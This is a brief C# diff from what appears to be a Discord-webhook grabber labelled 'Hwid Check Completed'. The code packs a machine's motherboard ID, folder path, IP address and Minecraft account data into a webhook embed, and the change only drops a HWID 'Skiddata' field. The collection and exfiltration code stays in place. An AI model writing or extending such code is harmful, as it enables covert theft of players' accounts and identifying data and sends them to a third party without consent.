@@ -95,8 +95,8 @@ namespace Main
                         new DiscordEmbedField("Motherboard ID: ", IDMB, false),
                         new DiscordEmbedField("Cartella: ", dir, false),
                         new DiscordEmbedField("IP: ", ip, false),
-                        new DiscordEmbedField("Minecraft Accounts: ", minecraftalts.ToString(),false),
-                        new DiscordEmbedField("Skiddata:", hwid, false)
+                        new DiscordEmbedField("Minecraft Accounts: ", minecraftalts.ToString(),false)
+
                 };
                 DiscordEmbed item = new DiscordEmbed("Avvio rilevato alle " + DateTime.Now, "", 16711680, "", "Hwid Check Completed", "", fields);
                 discordHookBuilder.Embeds.Add(item);
